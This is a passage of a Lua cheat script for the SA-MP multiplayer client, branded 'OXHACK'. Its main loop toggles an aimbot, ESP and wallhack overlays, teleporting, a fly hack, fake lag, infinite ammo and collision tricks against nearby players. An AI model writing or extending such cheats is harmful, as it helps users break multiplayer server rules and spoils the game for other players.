		lua_thread.create(Aimbot)
		autoTPLoop()
		   exec_cbug_delay()
        exec_cb_lifefoot()
        exec_lifefoot()
        exec_lifefoot1()
		
		lua_thread.create(function()
        while true do
            wait(3000)
            if app.isTimerActive then
                respawnCarById()
            end
        end
    end)
		
		if fakeActive[0] then
            simulateUnoccupiedSync()
        end
    
		
		if objetoLocalizando and objectId[0] ~= 0 then
            local px, py, pz = getCharCoordinates(PLAYER_PED)
            local p2dX, p2dY = convert3DCoordsToScreen(px, py, pz)

            for _, obj in ipairs(getAllObjects()) do
                if isObjectOnScreen(obj) then
                    local ok, x, y, z = getObjectCoordinates(obj)
                    local model = getObjectModel(obj)

                    if model == objectId[0] then
                        local sx, sy = convert3DCoordsToScreen(x, y, z)
                        local dist = string.format("%.1f", getDistanceBetweenCoords3d(px, py, pz, x, y, z))

                        renderDrawLine(p2dX, p2dY, sx, sy, 1.3, 0xFF00FFAA)
                        renderFontDrawText(font, "OBJETO - Dist: " .. dist .. "m", sx, sy, 0xFFFFFFAA)
                    end
                end
            end
        end

		if autoSpawn[0] then
			sampSendSpawn()
		end
        
        if EASY.teste67[0] then
          setCharHealth(PLAYER_PED, 100)
					wait(10)
					setCharHealth(PLAYER_PED, 30)
					wait(10)
					setCharHealth(PLAYER_PED, 10)
					wait(10)
					setCharHealth(PLAYER_PED, 60)
					wait(10)
					setCharHealth(PLAYER_PED, 90)
				end
				
				if EASY.teste31[0] then
          for iter_9_1 = 0, sampGetMaxPlayerId(false) do
						if sampIsPlayerConnected(iter_9_1) then
							local var_9_38, var_9_39 = sampGetCharHandleBySampPlayerId(iter_9_1)
		
							if var_9_38 and doesCharExist(var_9_39) then
								local var_9_40, var_9_41, var_9_42 = getCharCoordinates(var_9_39)
								local var_9_43, var_9_44, var_9_45 = getCharCoordinates(PLAYER_PED)
		
								if getDistanceBetweenCoords3d(var_9_40, var_9_41, var_9_42, var_9_43, var_9_44, var_9_45) < 0.4 then
									setCharCollision(var_9_39, false)
								end
							end
						end
					end
				end
				
				if fakeLagActive[0] then
            printString("FAKE LAG ON", 1000)
            wait(fakeLagDelay[0] / 2)
            fakeLagNop = false
            wait(fakeLagDelay[0] / 2)
            fakeLagNop = true
        end
        
        if fastPunch[0] then
            applyFastPunch()
        end
        
        if EASY.flodarmorte[0] then 
            setCharHealth(PLAYER_PED, 0) 
            setCharHealth(PLAYER_PED, 100) 
        end 
        

        if infiniteAmmo[0] then
            local weapon = getCurrentCharWeapon(PLAYER_PED)
            if weapon ~= 0 then
                setCharAmmo(PLAYER_PED, weapon, 9999)
                setCurrentCharWeapon(PLAYER_PED, 9999)
            end
        end
        
        if autoPuxar[0] then
            puxarVeiculoMaisProximo()
            autoPuxar[0] = false
        end
        
        if teleporteAtivo[0] and not teletransportado then
            local ok, x, y, z = getTargetBlipCoordinates()
            if ok then
                local groundZ = getGroundZFor3dCoord(x, y, 1000.0)
                setCharCoordinates(PLAYER_PED, x, y, groundZ + 1.0)
                teletransportado = true
                sampAddChatMessage("{00FF00}TELEPORTADO PARA O MARCADOR", -1)
            end
        end
        
        if EASY.nostun[0] then
                setCharAnimSpeed(PLAYER_PED, "DAM_armL_frmBK", 999)
                setCharAnimSpeed(PLAYER_PED, "DAM_armL_frmFT", 999)
                setCharAnimSpeed(PLAYER_PED, "DAM_armL_frmLT", 999)
                setCharAnimSpeed(PLAYER_PED, "DAM_armR_frmBK", 999)
                setCharAnimSpeed(PLAYER_PED, "DAM_armR_frmFT", 999)
                setCharAnimSpeed(PLAYER_PED, "DAM_armR_frmRT", 999)
                setCharAnimSpeed(PLAYER_PED, "DAM_LegL_frmBK", 999)
                setCharAnimSpeed(PLAYER_PED, "DAM_LegL_frmFT", 999)
                setCharAnimSpeed(PLAYER_PED, "DAM_LegL_frmLT", 999)
                setCharAnimSpeed(PLAYER_PED, "DAM_LegR_frmBK", 999)
                setCharAnimSpeed(PLAYER_PED, "DAM_LegR_frmFT", 999)
                setCharAnimSpeed(PLAYER_PED, "DAM_LegR_frmRT", 999)
                setCharAnimSpeed(PLAYER_PED, "DAM_stomach_frmBK", 999)
                setCharAnimSpeed(PLAYER_PED, "DAM_stomach_frmFT", 999)
                setCharAnimSpeed(PLAYER_PED, "DAM_stomach_frmLT", 999)
                setCharAnimSpeed(PLAYER_PED, "DAM_stomach_frmRT", 999)
          end
          
          
            
            if EASY.esp_enabled[0] then renderESP() end
        if EASY.ESP_ESQUELETO[0] then drawSkeletonESP() end
        if EASY.wallhack_enabled[0] then renderWallhack() end
        if EASY.espcar_enabled[0] then esplinhacarro() end
        if EASY.espcarlinha_enablade[0] then espcarlinha() end
        if EASY.espinfo_enabled[0] then espinfo() end
        if EASY.espplataforma[0] then espplataforma() end
             
             if speedHack[0] then
			for _, animName in ipairs(all_anims) do
				setCharAnimSpeed(PLAYER_PED, animName, 2.5)
			end
		end
        
        if airbrake_enabled[0] then
            processFlyHack()
        elseif airbrake_last_state then
            -- AirBrake acabou de ser desligado
            if last_car and doesVehicleExist(last_car) then
                freezeCarPosition(last_car, false)
                setCarCollision(last_car, true)
            end
            
            if app.hg.ANTIDM[0] then
    -- Código do anti-DM aqui
end

            freezeCharPosition(PLAYER_PED, true)
            freezeCharPosition(PLAYER_PED, false)
            setCharCollision(PLAYER_PED, true)
            setPlayerControl(PLAYER_HANDLE, true)
            restoreCameraJumpcut()
            clearCharTasksImmediately(PLAYER_PED)

            local x, y, z = getCharCoordinates(PLAYER_PED)
            setCharCoordinates(PLAYER_PED, x, y, z - 0.5)

            sampAddChatMessage("[OXHACK] AIRBREAK DESLIGADO ", 0xDC143C)

            was_in_car = false
            last_car = nil
        end

        airbrake_last_state = airbrake_enabled[0]
    end
local circuloFOVAIM = sulist.cabecaAIM[0] or sulist.peitoAIM[0] or sulist.virilhaAIM[0] or sulist.lockAIM[0]  or sulist.bracoAIM[0] or sulist.braco2AIM[0] or sulist.pernaAIM[0] or sulist.perna2AIM[0]
            local screenWidth, screenHeight = getScreenResolution()
            local circleX = screenWidth / 1.923
            local circleY = screenHeight / 2.306

            if circuloFOVAIM then
                if isCurrentCharWeapon(PLAYER_PED, 34) then
                    local newCircleX = screenWidth / 2
                    local newCircleY = screenHeight / 2
                    local newRadius = slide.fovvaimbotcirculo[0]
                    local colorHex = colorToHex(slide.fovCorAimmm[0], slide.fovCorAimmm[1], slide.fovCorAimmm[2], slide.fovCorAimmm[3])
                    drawCircle(newCircleX, newCircleY, newRadius, colorHex)
                elseif not isCurrentCharWeapon(PLAYER_PED, 0) then
                    local radius = slide.fovvaimbotcirculo[0]
                    local colorHex = colorToHex(slide.fovCorAimmm[0], slide.fovCorAimmm[1], slide.fovCorAimmm[2], slide.fovCorAimmm[3])
                    drawCircle(circleX, circleY, radius, colorHex)
            end    
        end 
	end